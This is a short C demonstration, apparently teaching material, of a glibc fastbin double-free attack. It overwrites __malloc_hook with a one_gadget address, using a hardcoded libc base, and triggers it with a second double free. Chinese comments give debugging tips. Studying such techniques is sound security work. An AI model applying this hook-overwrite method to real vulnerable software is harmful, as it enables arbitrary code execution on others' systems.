#include <stdio.h>
#include <stdlib.h>

int main() {
    size_t *p1, *p2, *p3, *p4, *p5;
    p5 = malloc(0x30);
    size_t fake_chunk[4];
    fake_chunk[0] = 0;
    fake_chunk[1] = 0x60; // size 不一致，报错 找到 glibc 源码 malloc.c 复制到当前目录，调试可进入源码
    p1 = malloc(0x60);
    p2 = malloc(0x60);
    free(p1);
    free(p2);
    free(p1);
    p3 = malloc(0x60);
    size_t libc = 0x7ffff7a0d000;
    size_t ogg = 0x4527a + libc; // one_gage
    size_t malloc_hook = 0x3c4b10 + libc;

    // p3[0] = fake_chunk;
    p3[0] = malloc_hook - 0x23;
    p3 = malloc(0x60);
    p3 = malloc(0x60);
    p3 = malloc(0x60);

    void *p = p3;
    p4 = &p[19];
    *p4 = ogg;
    free(p5);
    free(p5); // double free通常是可以直接完成 gaget的

    return 0;
}
